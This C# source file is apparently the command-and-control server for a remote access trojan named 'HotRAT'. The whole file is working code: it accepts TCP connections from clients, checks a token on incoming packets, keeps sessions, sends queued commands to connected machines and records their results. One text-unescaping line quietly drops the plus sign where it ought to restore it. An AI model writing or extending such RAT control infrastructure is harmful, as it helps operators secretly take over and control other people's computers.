using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Text;
using System.Threading.Tasks;
using HPSocket;
using HPSocket.WebSocket;
using Newtonsoft.Json;
using static System.Net.Mime.MediaTypeNames;

namespace HotRAT_Server.Models
{
    public class SymbolEscaper
    {
        public static string UnescapeSymbols(string input)
        {
            if (string.IsNullOrEmpty(input))
            {
                return input;
            }

            string[] symbols = { "&", "+", "=", "?" };
            string[] escapeSymbols = { " {amp;} ", " {plus;} ", " {eq;} ", " {quest;} " };

            for (int i = 0; i < symbols.Length; i++)
            {
                input = input.Replace(escapeSymbols[i], symbols[i]);
            }

            return input;
        }

    }
    public class Server
    {
        public TcpListener _server;
        public Dictionary<IntPtr, ClientInfo> _clients = new();
        public Dictionary<string, SessionModel> _sessions = new();
        public Dictionary<string, string> _waitevent = new();

        public Server()
        {
            _server = new TcpListener(IPAddress.Any, 0);
        }

        public bool Start(string ip, ushort port)
        {
            _server = new TcpListener(IPAddress.Parse(ip), port);
            _server.Start();
            Console.WriteLine($"服务器启动 tcp://{ip}:{port}/");

            Task.Run(AcceptClients);
            return true;
        }



        #region TCPServer
        private async Task AcceptClients()
        {
            while (true)
            {
                var tcpClient = await _server.AcceptTcpClientAsync();
                _ = Task.Run(() => HandleClient(tcpClient));
            }
        }

        private async Task HandleClient(TcpClient tcpClient)
        {
            var clientInfo = new ClientInfo
            {
                _client = tcpClient,
                ClientID = (_clients.Values.Count + 1).ToString(),
                IP = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString(),
                Port = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Port,
                ConnectTime = DateTime.Now
            };

            lock (_clients)
            {
                _clients[new IntPtr(tcpClient.Client.Handle.ToInt64())] = clientInfo;
            }

            Console.WriteLine($"已连接: {clientInfo}");

            var networkStream = tcpClient.GetStream();
            var buffer = new byte[32768];

            try
            {
                while (true)
                {
                    int bytesRead = await networkStream.ReadAsync(buffer, 0, buffer.Length);
                    if (bytesRead == 0)
                        break;

                    OnReceive(networkStream, new IntPtr(tcpClient.Client.Handle.ToInt64()), buffer, bytesRead);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error while handling client {clientInfo.ClientID}: {ex.Message}");
            }
            finally
            {
                OnClose(new IntPtr(tcpClient.Client.Handle.ToInt64()));
                tcpClient.Close();
            }
        }

        private void OnReceive(NetworkStream stream, IntPtr connId, byte[] buffer, int received)
        {
            lock (_clients)
            {
                if (_clients.TryGetValue(connId, out var clientInfo))
                {
                    clientInfo.ConnectTime = DateTime.Now;

                    string[] lines = Encoding.UTF8.GetString(buffer, 0, received).Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);

                    if (lines.Length >= 3)
                    {
                        string token = lines[0];
                        string flagString = lines[1];
                        string content = SymbolEscaper.UnescapeSymbols(string.Join("\n", lines.Skip(2)));

                        content = content.Replace(" {amp;} ","&").Replace(" {plus;} ","").Replace(" {eq;} ", "=").Replace(" {quest;} ", "?");
                        if (token == AuthModel.Token())
                        {
                            if (uint.TryParse(flagString, out uint flag))
                            {
                                Console.WriteLine("\n---------------------------");
                                Console.ForegroundColor = ConsoleColor.Green;

                                Console.WriteLine($"收到数据 {clientInfo.ClientID}:");
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine($"Token: {token}\nFlag: {flag}\nContent: {content}");

                                Console.ResetColor();
                                Console.WriteLine("---------------------------\n");

                                Packet pkt = new Packet(token, flag, content);
                                Handle.PacketHandle.Handle(pkt, clientInfo);
                            }
                        }
                    }
                }
            }
        }

        private void OnClose(IntPtr connId)
        {
            lock (_clients)
            {
                if (_clients.TryGetValue(connId, out var clientInfo))
                {
                    Console.WriteLine($"Client disconnected: {clientInfo}");
                    _clients.Remove(connId);
                }
            }
        }
        #endregion


        public string GetAllClientsAsJson()
        {
            lock (_clients)
            {
                return JsonConvert.SerializeObject(_clients.Values, Formatting.Indented);
            }
        }

        public string GetAllSessionAsJson()
        {
            lock (_sessions)
            {
                return JsonConvert.SerializeObject(_sessions, Formatting.Indented);
            }
        }

        public string GetClientByIpPort(string ip, int port)
        {
            lock (_clients)
            {
                return JsonConvert.SerializeObject(_clients.Values.FirstOrDefault(c => c.IP == ip && c.Port == port), Formatting.Indented);
            }
        }

        public async Task<string> AddMessagesToSession(string sessionId, string text) // State 1 = OK | 2 = NO
        {
            if (Guid.TryParse(sessionId, out Guid sessionGuid) && _sessions.ContainsKey(sessionGuid.ToString()))
            {
                var session = _sessions[sessionGuid.ToString()];
                var message = new MessageModel
                {
                    State = 2,
                    Content = text
                };
                var historyList = session.Historys.ToList();

                var waitId = Guid.NewGuid().ToString();
                message.Code = waitId;
                _waitevent.Add(waitId, "");

                Console.WriteLine($"发送[{await SendMessage(sessionId, $"{waitId}\n{text}")}] 待办码:{waitId} {text}");

                historyList.Add(message);
                session.Historys = historyList.ToArray();
                return waitId;
            }
            else return "";
        }

        public bool UpdateMessageState(string sessionId, string result, string waitCode)
        {
            if (Guid.TryParse(sessionId, out Guid sessionGuid) && _sessions.ContainsKey(sessionGuid.ToString()))
            {
                var session = _sessions[sessionGuid.ToString()];
                foreach (var message in session.Historys)
                {
                    if (message.Code == waitCode)
                    {
                        message.State = 1;
                        message.Result = result;
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"待办[{sessionId}][{waitCode}] - [{message.Content}] 已完成");
                        Console.ResetColor();
                        return true;
                    }
                }
            }
            return false;
        }

        public async Task<bool> SendMessage(string sessionId, string text)
        {
            if (Guid.TryParse(sessionId, out Guid sessionGuid) && _sessions.ContainsKey(sessionGuid.ToString()))
            {
                var session = _sessions[sessionGuid.ToString()];
                var client = _clients.Values.FirstOrDefault(c => c.IP == session.ClientIp && c.Port.ToString() == session.ClientPort);
                if (client != null)
                {
                    var networkStream = client._client.GetStream();
                    if (networkStream.CanWrite)
                    {
                        byte[] messageBytes = Encoding.UTF8.GetBytes(text);
                        await networkStream.WriteAsync(messageBytes, 0, messageBytes.Length);
                        return true;
                    }
                }
            }
            return false;
        }

        public void Stop()
        {
            _server.Stop();
        }

    }
}
